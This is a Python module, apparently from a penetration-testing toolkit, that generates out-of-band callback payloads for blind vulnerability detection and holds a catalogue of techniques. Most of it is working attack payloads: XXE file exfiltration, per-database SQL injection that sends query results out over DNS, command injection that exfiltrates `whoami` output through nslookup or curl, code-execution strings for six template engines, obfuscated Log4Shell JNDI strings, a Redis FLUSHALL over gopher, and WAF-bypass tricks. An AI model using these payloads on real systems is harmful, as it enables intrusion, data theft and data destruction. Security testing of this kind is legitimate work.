"""OAST payload generator — canaries and injection templates for every attack class.

Generates ready-to-use OAST canaries and the corresponding payloads for blind
detection of: XXE, SSRF, SQLi (per-DBMS), command injection, SSTI, log4shell,
SSTI, prototype pollution, deserialization, and HTTP header injection.

The payloads use the canary host/domain from the configured OastStore —
whether that's a self-hosted interactsh, a Burp Collaborator domain, or the
built-in HTTP catcher. Each payload carries a unique token so callbacks are
correlated back to the exact probe.

Research sources:
- PortSwigger OAST / Burp Collaborator (pioneer, DNS+HTTP+SMTP)
- Collabfiltrator (SQLi DNS exfiltration for MSSQL/MySQL/PostgreSQL/Oracle)
- CN-SEC DNSlog (async/multi-threaded SQLi detection insight)
- Pentestas OAST canaries (interactsh-server integration)

Key insight from CN-SEC: OAST SQLi finds injections in async/multi-threaded
code paths where time-based blind SQLi DOESN'T work — the delay runs in a
different thread and never affects the response. This makes OAST not just
"another detection method" but the ONLY method for async injection points.
"""

from __future__ import annotations

from dataclasses import dataclass


@dataclass
class OastPayload:
    """A single generated payload with metadata."""
    token: str
    canary_host: str
    canary_url_http: str
    canary_url_https: str
    attack_class: str
    dbms: str | None
    payload: str
    payload_encoded: str | None
    notes: str


class OastPayloadGen:
    """Generate OAST canaries and payloads for every attack class."""

    def __init__(self, canary_domain: str = "", canary_http_base: str = ""):
        """canary_domain: DNS-based OAST (e.g. oast.example.com) — subdomain per token.
        canary_http_base: HTTP-only OAST (e.g. 127.0.0.1:36313) — path per token."""
        self.domain = canary_domain.strip().lstrip(".")
        self.http_base = canary_http_base.strip()

    def _token(self) -> str:
        import secrets
        return secrets.token_hex(8)

    def _canary(self, token: str | None = None) -> tuple[str, str, str]:
        """Returns (canary_host, http_url, https_url)."""
        tok = token or self._token()
        if self.domain:
            host = f"{tok}.{self.domain}"
            return host, f"http://{host}/", f"https://{host}/"
        elif self.http_base:
            return self.http_base, f"http://{self.http_base}/{tok}", f"https://{self.http_base}/{tok}"
        else:
            placeholder = "OAST-UNCONFIGURED"
            return placeholder, f"http://{placeholder}/{tok}", f"https://{placeholder}/{tok}"

    def _make(self, attack_class: str, payload: str, dbms: str | None = None,
              encoded: str | None = None, notes: str = "") -> OastPayload:
        import secrets
        tok = secrets.token_hex(8)
        host, http_url, https_url = self._canary(tok)
        return OastPayload(
            token=tok, canary_host=host, canary_url_http=http_url,
            canary_url_https=https_url, attack_class=attack_class, dbms=dbms,
            payload=payload, payload_encoded=encoded, notes=notes
        )

    # ─── XXE ────────────────────────────────────────────────────────────────

    def xxe_oob(self) -> OastPayload:
        """Blind XXE — OOB via external entity. Works when parser fetches URLs."""
        tok = self._token()
        host, http_url, _ = self._canary(tok)
        payload = (
            f'<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{http_url}"> %xxe;]>'
        )
        return self._make("xxe", payload, notes="Embed in XML body; parser fetches canary URL")

    def xxe_oob_data_exfil(self, file_path: str = "/etc/hostname") -> OastPayload:
        """Blind XXE with data exfiltration via parameter entities + error-based."""
        tok = self._token()
        host, http_url, _ = self._canary(tok)
        payload = (
            f'<!DOCTYPE foo ['
            f'<!ENTITY % file SYSTEM "file://{file_path}">'
            f'<!ENTITY % dtd SYSTEM "{http_url}/evil.dtd">'
            f'%dtd;'
            f']>'
        )
        return self._make("xxe", payload, notes=f"Exfiltrate {file_path} via external DTD")

    def xxe_oob_http(self) -> OastPayload:
        """Simple XXE via SYSTEM entity (HTTP fetch)."""
        tok = self._token()
        host, http_url, _ = self._canary(tok)
        payload = (
            f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{http_url}">]>\n<foo>&xxe;</foo>'
        )
        return self._make("xxe", payload, notes="Classic XXE OOB — entity in XML body")

    # ─── SSRF ───────────────────────────────────────────────────────────────

    def ssrf_basic(self) -> OastPayload:
        """Blind SSRF — embed canary URL in a parameter."""
        tok = self._token()
        host, http_url, https_url = self._canary(tok)
        return self._make("ssrf", http_url, notes="Embed in URL parameter (url=, redirect=, next=)")

    def ssrf_https(self) -> OastPayload:
        """SSRF with HTTPS URL."""
        tok = self._token()
        host, http_url, https_url = self._canary(tok)
        return self._make("ssrf", https_url, notes="HTTPS variant — some servers only follow HTTPS")

    def ssrf_cloud_metadata(self, provider: str = "aws") -> OastPayload:
        """SSRF targeting cloud metadata (IMDS) — response-based, canary confirms reachability."""
        tok = self._token()
        host, http_url, _ = self._canary(tok)
        metadata_urls = {
            "aws": "http://169.254.169.254/latest/meta-data/",
            "gcp": "http://metadata.google.internal/computeMetadata/v1/",
            "azure": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "alibaba": "http://100.100.100.200/latest/meta-data/",
            "digitalocean": "http://169.254.169.254/metadata/v1.json",
        }
        target = metadata_urls.get(provider, metadata_urls["aws"])
        return self._make("ssrf", target, notes=f"Cloud metadata ({provider}); combine with canary in redirect")

    def ssrf_protocol_smuggling(self, protocol: str = "gopher") -> OastPayload:
        """SSRF with protocol smuggling (gopher/dict/ftp)."""
        tok = self._token()
        host, http_url, _ = self._canary(tok)
        if protocol == "gopher":
            # gopher:// can send raw TCP — useful for internal Redis/memcached
            payload = f"gopher://{host}:6379/_FLUSHALL%0d%0a"
        elif protocol == "dict":
            payload = f"dict://{host}:11211/stat"
        else:
            payload = f"{protocol}://{host}/"
        return self._make("ssrf", payload, notes=f"Protocol smuggling ({protocol}) — raw TCP to internal services")

    # ─── SQLi (per-DBMS) ────────────────────────────────────────────────────

    def sqli_dns(self, dbms: str, query: str = "SELECT version()") -> OastPayload:
        """Blind SQLi with DNS exfiltration — per-DBMS payloads.

        Key insight (CN-SEC): OAST SQLi finds injections in async/multi-threaded
        code paths where time-based blind DOESN'T work — the SLEEP runs in a
        different thread and never affects the HTTP response.
        """
        tok = self._token()
        host, http_url, _ = self._canary(tok)
        canary = host if self.domain else f"{tok}.OAST-DNS-REQUIRED"

        payloads = {
            "postgresql": (
                f"COPY (SELECT '{query}') TO PROGRAM 'nslookup {canary}'",
                "PostgreSQL: needs SUPERUSER or pg_execute_server_program role; COPY TO PROGRAM"
            ),
            "mysql": (
                f"SELECT LOAD_FILE('\\\\\\\\{canary}\\\\a')",
                "MySQL: needs FILE privilege (usually root); UNC path triggers DNS on Windows"
            ),
            "mssql": (
                f"EXEC master..xp_dirtree '\\\\\\\\{canary}\\\\a'",
                "MSSQL: xp_dirtree triggers DNS on UNC path; needs stacked queries"
            ),
            "oracle_utl": (
                f"SELECT UTL_INADDR.get_host_address('{canary}') FROM dual",
                "Oracle: UTL_INADDR — needs execute on UTL_INADDR"
            ),
            "oracle_xxe": (
                f"SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
                f"<!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://{canary}/\"> %remote;]>'),'/l') FROM dual",
                "Oracle: XXE via EXTRACTVALUE — needs DBMS_XMLGEN"
            ),
            "oracle_http": (
                f"SELECT UTL_HTTP.request('http://{canary}/') FROM dual",
                "Oracle: UTL_HTTP — needs execute on UTL_HTTP"
            ),
        }

        if dbms not in payloads:
            raise ValueError(f"Unsupported DBMS: {dbms}. Supported: {list(payloads.keys())}")

        payload, notes = payloads[dbms]
        return self._make("sqli", payload, dbms=dbms, notes=notes)

    def sqli_dns_exfil(self, dbms: str, query: str) -> OastPayload:
        """SQLi DNS exfiltration — encode query result in DNS subdomain.

        Uses the pattern: (SELECT data).canary.com — the query result becomes
        a DNS label, visible in the DNS query log.
        """
        tok = self._token()
        host, http_url, _ = self._canary(tok)
        canary = host if self.domain else f"{tok}.OAST-DNS-REQUIRED"

        payloads = {
            "postgresql": (
                f"COPY (SELECT encode(('{query}')::bytea, 'hex')) TO PROGRAM "
                f"'nslookup ' || ({query}) || '.{canary}'",
                "PostgreSQL: hex-encode result in subdomain; needs elevated privs"
            ),
            "mssql": (
                f"DECLARE @p VARCHAR(1024); SET @p = ({query}); "
                f"EXEC('master..xp_dirtree \"\\\\' + @p + '.{canary}\\\\a\"')",
                "MSSQL: data in UNC subdomain; needs stacked queries"
            ),
            "oracle": (
                f"SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\"?>"
                f"<!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://'||({query})||'.{canary}/\"> %remote;]>'),'/l') FROM dual",
                "Oracle: data in HTTP host subdomain"
            ),
            "mysql": (
                f"SELECT ({query}) INTO OUTFILE '\\\\\\\\{canary}\\\\a'",
                "MySQL: needs FILE privilege; data not in DNS but confirms injection"
            ),
        }

        if dbms not in payloads:
            raise ValueError(f"Unsupported DBMS: {dbms}. Supported: {list(payloads.keys())}")

        payload, notes = payloads[dbms]
        return self._make("sqli", payload, dbms=dbms, notes=f"Data exfil: {notes}")

    # ─── Command Injection ──────────────────────────────────────────────────

    def cmdi_oob(self, platform: str = "linux") -> OastPayload:
        """Blind command injection — OOB via DNS/HTTP callback."""
        tok = self._token()
        host, http_url, _ = self._canary(tok)

        if platform == "linux":
            payload = f"`nslookup {host}`"
            notes = "Linux: backtick nslookup — embed in any param that reaches shell"
        elif platform == "windows":
            payload = f"& nslookup {host} &"
            notes = "Windows: & nslookup — embed in param that reaches cmd.exe"
        else:
            payload = f";nslookup {host};"
            notes = "Generic: semicolon nslookup"

        return self._make("cmdi", payload, notes=notes)

    def cmdi_oob_exfil(self, platform: str = "linux", command: str = "whoami") -> OastPayload:
        """Blind command injection with output exfiltration via DNS subdomain."""
        tok = self._token()
        host, http_url, _ = self._canary(tok)

        if platform == "linux":
            payload = f"`nslookup $(whoami).{host}`"
            notes = f"Linux: exfil '{command}' output in DNS subdomain"
        elif platform == "windows":
            payload = f"& for /f %i in ('{command}') do nslookup %i.{host} &"
            notes = f"Windows: exfil '{command}' output in DNS subdomain"
        else:
            payload = f";{command} | nslookup {host};"
            notes = "Generic: pipe command to nslookup"

        return self._make("cmdi", payload, notes=notes)

    def cmdi_oob_curl(self, platform: str = "linux") -> OastPayload:
        """Blind command injection via curl (HTTP callback, not DNS)."""
        tok = self._token()
        host, http_url, _ = self._canary(tok)

        if platform == "linux":
            payload = f"`curl -s {http_url}`"
            notes = "Linux: curl callback (HTTP, not DNS) — useful when DNS is blocked"
        elif platform == "windows":
            payload = f"& powershell -c \"Invoke-WebRequest {http_url}\" &"
            notes = "Windows: PowerShell HTTP callback"
        else:
            payload = f";curl {http_url};"
            notes = "Generic: curl HTTP callback"

        return self._make("cmdi", payload, notes=notes)

    # ─── SSTI ───────────────────────────────────────────────────────────────

    def ssti_oob(self, engine: str = "jinja2") -> OastPayload:
        """Blind SSTI — OOB via template engine's HTTP/DNS functions."""
        tok = self._token()
        host, http_url, _ = self._canary(tok)

        payloads = {
            "jinja2": (
                "{{ ''.__class__.__mro__[1].__subclasses__()[X]('nslookup " + host + "', shell=True, stderr=-1, stdout=-1) }}",
                "Jinja2: find subprocess.Popen index (X) — OOB via nslookup"
            ),
            "twig": (
                f"{{{{ _self.env.registerUndefinedFilterCallback('exec') }}}}"
                f"{{{{ _self.env.getFilter('nslookup {host}') }}}}",
                "Twig: registerUndefinedFilterCallback + exec"
            ),
            "freemarker": (
                f"<#assign ex='freemarker.template.utility.Execute'?new()>${{ex('nslookup {host}')}}",
                "FreeMarker: Execute directive — OOB via nslookup"
            ),
            "velocity": (
                f"#set($e='exp')$e.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke($e.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'nslookup {host}')",
                "Velocity: Runtime.exec — OOB via nslookup"
            ),
            "erb": (
                f"<%= `nslookup {host}` %>",
                "ERB (Ruby): backtick exec — OOB via nslookup"
            ),
            "smarty": (
                f"{{{{smarty::internal_exec('nslookup {host}')}}}}",
                "Smarty: internal_exec — OOB via nslookup"
            ),
        }

        if engine not in payloads:
            raise ValueError(f"Unsupported engine: {engine}. Supported: {list(payloads.keys())}")

        payload, notes = payloads[engine]
        return self._make("ssti", payload, notes=notes)

    # ─── Log4Shell / JNDI ───────────────────────────────────────────────────

    def log4shell(self) -> OastPayload:
        """Log4Shell (CVE-2021-44228) — JNDI lookup to canary LDAP/RMI server."""
        tok = self._token()
        host, http_url, _ = self._canary(tok)

        payloads_jndi = [
            f"${{jndi:ldap://{host}/x}}",
            f"${{jndi:rmi://{host}/x}}",
            f"${{jndi:dns://{host}}}",
            f"${{::-J}}${{::-N}}${{::-D}}${{::-I}}:${{::-l}}${{::-d}}${{::-a}}${{::-p}}://{host}/x",
        ]
        # Return the DNS variant (most likely to bypass egress filtering)
        return self._make("log4shell", payloads_jndi[2], notes="Log4Shell JNDI DNS lookup; also try ldap/rmi variants")

    def log4shell_all_variants(self) -> list[OastPayload]:
        """All Log4Shell variants (LDAP, RMI, DNS, obfuscated)."""
        tok = self._token()
        host, http_url, _ = self._canary(tok)
        variants = [
            ("ldap", f"${{jndi:ldap://{host}/x}}"),
            ("rmi", f"${{jndi:rmi://{host}/x}}"),
            ("dns", f"${{jndi:dns://{host}}}"),
            ("obfuscated", f"${{::-J}}${{::-N}}${{::-D}}${{::-I}}:${{::-l}}${{::-d}}${{::-a}}${{::-p}}://{host}/x"),
        ]
        results = []
        for variant, payload in variants:
            results.append(self._make("log4shell", payload, notes=f"Log4Shell {variant} variant"))
        return results

    # ─── HTTP Header Injection ──────────────────────────────────────────────

    def header_injection(self) -> OastPayload:
        """CRLF / header injection — canary in injected header."""
        tok = self._token()
        host, http_url, _ = self._canary(tok)
        payload = f"X-Oast-Canary: {tok}\r\nSet-Cookie: oast={tok}"
        return self._make("header_injection", payload, notes="CRLF injection — canary header appears in response")

    # ─── Open Redirect ──────────────────────────────────────────────────────

    def open_redirect(self) -> OastPayload:
        """Open redirect to canary — confirms redirect without visiting target."""
        tok = self._token()
        host, http_url, _ = self._canary(tok)
        return self._make("open_redirect", http_url, notes="Embed in redirect param (url=, next=, redirect=)")

    # ─── Deserialization (Java/PHP) ─────────────────────────────────────────

    def deserialize_oob(self, lang: str = "java") -> OastPayload:
        """Blind deserialization — OOB via DNS lookup in gadget chain."""
        tok = self._token()
        host, http_url, _ = self._canary(tok)

        if lang == "java":
            # Conceptual — actual payload requires ysoserial gadget chain
            payload = f"[serialized Java object with Runtime.exec('nslookup {host}')]"
            notes = "Java: use ysoserial with DNS-canary command; confirms deserialization"
        elif lang == "php":
            payload = f'O:8:"PHPClass":1:{{s:4:"test";s:{{len}}:"nslookup {host}";}}'
            notes = "PHP: use phpggc with DNS-canary command"
        else:
            payload = f"[serialized object with nslookup {host}]"
            notes = f"{lang}: use appropriate gadget chain with DNS-canary"

        return self._make("deserialize", payload, notes=notes)

    # ─── Fastjson / Jackson ─────────────────────────────────────────────────

    def fastjson_oob(self) -> OastPayload:
        """Fastjson/Jackson autoType — OOB via DNS lookup (benign, no JNDI)."""
        tok = self._token()
        host, http_url, _ = self._canary(tok)

        payload = (
            f'{{"@type":"java.net.Inet4Address","val":"{host}"}}'
        )
        return self._make("fastjson", payload, notes="Fastjson autoType — Inet4Address triggers DNS; no JNDI, no code exec")

    def fastjson_jackson_array(self) -> OastPayload:
        """Jackson array form autoType — OOB via DNS lookup."""
        tok = self._token()
        host, http_url, _ = self._canary(tok)

        payload = (
            f'["java.net.Inet4Address","{host}"]'
        )
        return self._make("fastjson", payload, notes="Jackson array autoType — Inet4Address DNS callback")

    # ─── Prototype Pollution (SSRF via fetch) ───────────────────────────────

    def proto_pollution_ssrf(self) -> OastPayload:
        """Client-side prototype pollution → SSRF via polluted fetch URL."""
        tok = self._token()
        host, http_url, _ = self._canary(tok)
        payload = f"?__proto__[src]={http_url}"
        return self._make("proto_pollution", payload, notes="Prototype pollution → SSRF via polluted property")

    # ─── Batch generation ───────────────────────────────────────────────────

    def generate_all(self) -> dict[str, list[OastPayload]]:
        """Generate payloads for ALL attack classes — useful for systematic testing."""
        results = {}
        # XXE
        results["xxe"] = [self.xxe_oob(), self.xxe_oob_http()]
        # SSRF
        results["ssrf"] = [self.ssrf_basic(), self.ssrf_https(), self.ssrf_cloud_metadata("aws"),
                          self.ssrf_cloud_metadata("gcp"), self.ssrf_protocol_smuggling("gopher")]
        # SQLi per DBMS
        results["sqli"] = []
        for dbms in ["postgresql", "mysql", "mssql", "oracle_utl", "oracle_xxe", "oracle_http"]:
            try:
                results["sqli"].append(self.sqli_dns(dbms))
            except ValueError:
                pass
        # Command injection
        results["cmdi"] = [self.cmdi_oob("linux"), self.cmdi_oob("windows"),
                          self.cmdi_oob_curl("linux"), self.cmdi_oob_exfil("linux")]
        # SSTI
        results["ssti"] = [self.ssti_oob("jinja2"), self.ssti_oob("twig"),
                          self.ssti_oob("freemarker"), self.ssti_oob("erb")]
        # Log4Shell
        results["log4shell"] = self.log4shell_all_variants()
        # Deserialization
        results["deserialize"] = [self.deserialize_oob("java"), self.deserialize_oob("php")]
        # Fastjson
        results["fastjson"] = [self.fastjson_oob(), self.fastjson_jackson_array()]
        # Header injection
        results["header_injection"] = [self.header_injection()]
        # Open redirect
        results["open_redirect"] = [self.open_redirect()]
        # Prototype pollution
        results["proto_pollution"] = [self.proto_pollution_ssrf()]
        return results

    def generate_for_class(self, attack_class: str, **kwargs) -> OastPayload | list[OastPayload]:
        """Generate payload(s) for a specific attack class."""
        dispatch = {
            "xxe": lambda: self.xxe_oob(),
            "xxe_http": lambda: self.xxe_oob_http(),
            "xxe_exfil": lambda: self.xxe_oob_data_exfil(kwargs.get("file_path", "/etc/hostname")),
            "ssrf": lambda: self.ssrf_basic(),
            "ssrf_https": lambda: self.ssrf_https(),
            "ssrf_metadata": lambda: self.ssrf_cloud_metadata(kwargs.get("provider", "aws")),
            "ssrf_protocol": lambda: self.ssrf_protocol_smuggling(kwargs.get("protocol", "gopher")),
            "sqli": lambda: self.sqli_dns(kwargs.get("dbms", "postgresql")),
            "sqli_exfil": lambda: self.sqli_dns_exfil(kwargs.get("dbms", "postgresql"), kwargs.get("query", "SELECT user")),
            "cmdi": lambda: self.cmdi_oob(kwargs.get("platform", "linux")),
            "cmdi_exfil": lambda: self.cmdi_oob_exfil(kwargs.get("platform", "linux"), kwargs.get("command", "whoami")),
            "cmdi_curl": lambda: self.cmdi_oob_curl(kwargs.get("platform", "linux")),
            "ssti": lambda: self.ssti_oob(kwargs.get("engine", "jinja2")),
            "log4shell": lambda: self.log4shell(),
            "log4shell_all": lambda: self.log4shell_all_variants(),
            "header_injection": lambda: self.header_injection(),
            "open_redirect": lambda: self.open_redirect(),
            "deserialize": lambda: self.deserialize_oob(kwargs.get("lang", "java")),
            "fastjson": lambda: self.fastjson_oob(),
            "fastjson_jackson": lambda: self.fastjson_jackson_array(),
            "proto_pollution": lambda: self.proto_pollution_ssrf(),
        }
        if attack_class not in dispatch:
            raise ValueError(f"Unknown attack class: {attack_class}. Available: {sorted(dispatch.keys())}")
        return dispatch[attack_class]()


# ─── Knowledge base: OAST techniques per attack class ──────────────────────

OAST_TECHNIQUES = {
    "xxe": {
        "name": "Blind XXE via OAST",
        "channels": ["HTTP", "DNS"],
        "prerequisites": "XML parser with external entity processing enabled",
        "detection": "Canary URL fetched by parser → HTTP/DNS callback",
        "data_exfil": "Parameter entities + external DTD → file content in callback",
        "waf_bypass": "Base64-encode DTD URL; use UTF-16 BOM; use parameter entities",
        "common_mistakes": "SYSTEM entity in main XML (not parameter) — some parsers skip those",
    },
    "ssrf": {
        "name": "Blind SSRF via OAST",
        "channels": ["HTTP", "DNS", "gopher", "dict", "ftp"],
        "prerequisites": "Server-side URL fetch from user-controlled input",
        "detection": "Canary URL resolved/fetched → callback",
        "data_exfil": "Redirect chain: canary→metadata endpoint→exfil via redirect",
        "waf_bypass": "URL encoding, IP in different formats (decimal, octal, hex), @-prefix",
        "common_mistakes": "Assuming HTTP-only — DNS callbacks work even when HTTP egress is blocked",
    },
    "sqli": {
        "name": "Blind SQLi via DNS OAST",
        "channels": ["DNS"],
        "prerequisites": "DBMS function that triggers DNS (varies by DBMS)",
        "detection": "DNS query to canary domain → confirms injection",
        "data_exfil": "Query result encoded as DNS subdomain label",
        "waf_bypass": "SQL comment splitting (/**/), hex encoding, CASE expressions",
        "common_mistakes": "Time-based blind FAILS on async/multi-threaded endpoints — OAST is the only way",
        "dbms_functions": {
            "postgresql": "COPY TO PROGRAM 'nslookup CANARY' (needs SUPERUSER)",
            "mysql": "LOAD_FILE('\\\\CANARY\\a') (needs FILE privilege, Windows only)",
            "mssql": "xp_dirtree '\\\\CANARY\\a' (needs stacked queries)",
            "oracle": "UTL_INADDR.get_host_address / UTL_HTTP.request / EXTRACTVALUE(XXE)",
        },
    },
    "cmdi": {
        "name": "Blind Command Injection via OAST",
        "channels": ["DNS", "HTTP"],
        "prerequisites": "User input reaches OS shell (system(), exec(), Runtime.exec())",
        "detection": "nslookup/curl to canary → callback",
        "data_exfil": "Command output in DNS subdomain: $(whoami).canary.com",
        "waf_bypass": "Backticks instead of $(), IFS separator, ${IFS} for spaces",
        "common_mistakes": "Using only HTTP (curl) — DNS (nslookup) works when HTTP is blocked",
    },
    "ssti": {
        "name": "Blind SSTI via OAST",
        "channels": ["DNS", "HTTP"],
        "prerequisites": "User input rendered in server-side template",
        "detection": "Template engine's exec/HTTP function calls canary",
        "data_exfil": "Engine-specific: Popen, Execute, Runtime.exec with command output in DNS",
        "waf_bypass": "Engine-specific object traversal; some engines have sandbox escapes",
        "common_mistakes": "Assuming one engine — test all (Jinja2, Twig, FreeMarker, Velocity, ERB, Smarty)",
    },
    "log4shell": {
        "name": "Log4Shell (CVE-2021-44228) via JNDI OAST",
        "channels": ["LDAP", "RMI", "DNS"],
        "prerequisites": "Vulnerable Log4j 2.x processes user input in log message",
        "detection": "JNDI lookup to canary LDAP/RMI/DNS → callback",
        "data_exfil": "Environment variables via JNDI reference ( ${env:SECRET} in JNDI URL)",
        "waf_bypass": "Obfuscated: ${::-J}${{::-N}...; nested: ${${lower:J}ndi:...};",
        "common_mistakes": "Only testing LDAP — DNS variant bypasses most egress filters; obfuscated variants bypass WAF",
    },
    "deserialize": {
        "name": "Blind Deserialization via OAST",
        "channels": ["DNS", "HTTP"],
        "prerequisites": "Application deserializes user-controlled data (Java/PHP/.NET/Python)",
        "detection": "Gadget chain executes nslookup/curl to canary",
        "data_exfil": "Gadget chain with command output in DNS subdomain",
        "waf_bypass": "Base64-encode serialized object; use Content-Type manipulation",
        "common_mistakes": "Not checking response timing — deserialization is slow; use OAST not timing",
    },
    "fastjson": {
        "name": "Fastjson/Jackson autoType via OAST",
        "channels": ["DNS"],
        "prerequisites": "JSON parser with autoType enabled (Fastjson, Jackson polymorphic)",
        "detection": "java.net.Inet4Address autoType → DNS lookup to canary (benign, no code exec)",
        "data_exfil": "Not directly — use JNDI gadget for RCE after confirming autoType",
        "waf_bypass": "Array form for Jackson; L-type prefix for Fastjson",
        "common_mistakes": "Using JNDI directly (dangerous) — Inet4Address confirms autoType WITHOUT code exec",
    },
}

# ─── Unexpected / creative techniques ──────────────────────────────────────

OAST_CREATIVE = {
    "async_sqli": {
        "name": "Async/multi-threaded SQLi detection",
        "insight": "Time-based blind SQLi FAILS on async endpoints because the SLEEP runs in a different thread. "
                   "The HTTP response returns immediately (from the main thread), so no delay is observable. "
                   "OAST (DNS callback) is the ONLY way to detect these injections.",
        "source": "CN-SEC, fkalis (海外SRC赏金挖掘)",
        "example": "Cookie TrackingId → background thread SQL query → DNS callback confirms injection "
                   "even though the HTTP response timing is unchanged",
    },
    "smtp_channel": {
        "name": "SMTP channel for OAST",
        "insight": "When HTTP and DNS egress are both blocked, SMTP (port 25) may still be open. "
                   "Interactsh supports SMTP callbacks. Inject email-sending functions with canary recipient.",
        "source": "PortSwigger Burp Collaborator (SMTP support)",
        "example": "PHP mail($to='canary@oast.domain'); Python smtplib; Java MimeMessage",
    },
    "multi_channel_fallback": {
        "name": "Multi-channel fallback strategy",
        "insight": "Always test multiple egress channels: HTTP → DNS → SMTP → ICMP → LDAP. "
                   "Corporate firewalls often block HTTP but allow DNS; block DNS but allow SMTP. "
                   "Don't assume one channel works — test all.",
        "source": "Pentestas, PortSwigger",
        "example": "curl canary (HTTP) → nslookup canary (DNS) → dig canary (DNS alt) → "
                   "ping canary (ICMP) → ldap://canary (LDAP)",
    },
    "data_in_subdomain": {
        "name": "Data exfiltration via DNS subdomain labels",
        "insight": "DNS labels can carry data: SELECT-output.canary.com. Each label max 63 chars, "
                   "total max 253 chars. For longer data, chunk across multiple labels or queries. "
                   "Hex-encode to preserve special characters (Collabfiltrator approach).",
        "source": "Collabfiltrator, CN-SEC DNSlog",
        "example": "MSSQL: xp_dirtree '\\\\<hex-data>.canary.com\\a' → DNS log shows hex data",
    },
    "jndi_dns_bypass": {
        "name": "JNDI DNS bypass for Log4Shell",
        "insight": "When LDAP/RMI egress is blocked, ${jndi:dns://canary} still works — "
                   "DNS is almost always allowed out. This confirms Log4Shell without needing "
                   "a malicious LDAP server.",
        "source": "Log4Shell research community",
        "example": "${jndi:dns://abc123.oast.example.com} → DNS callback confirms Log4j processes input",
    },
    "xxe_parameter_entities": {
        "name": "XXE parameter entities for data exfil",
        "insight": "Regular entities (&xxe;) are expanded in XML body but not in DTD. "
                   "Parameter entities (%xxe;) ARE expanded in DTD — use them to load external DTD "
                   "that defines error-based exfiltration. This is the ONLY way to exfiltrate data "
                   "with blind XXE.",
        "source": "PortSwigger Web Security Academy, 先知社区 (Aliyun XZ)",
        "example": "<!ENTITY % file SYSTEM 'file:///etc/passwd'><!ENTITY % dtd SYSTEM 'http://canary/evil.dtd'>%dtd;",
    },
    "waf_bypass_oast": {
        "name": "WAF bypass for OAST payloads",
        "insight": "WAFs may block known OAST domains (oast.fun, oast.pro, interactsh). "
                   "Use self-hosted with custom domain. For payload-level WAF bypass: "
                   "hex-encode canary host, use comment splitting in SQLi payloads, "
                   "use obfuscated JNDI for Log4Shell, use Base64 in XXE DTD URLs.",
        "source": "Codeby PT AF review, detection.fyi sigma rules",
        "example": "SQLi: OR/**/1=1/**/AND/**/nslookup/**/canary — comment-split keywords",
    },
}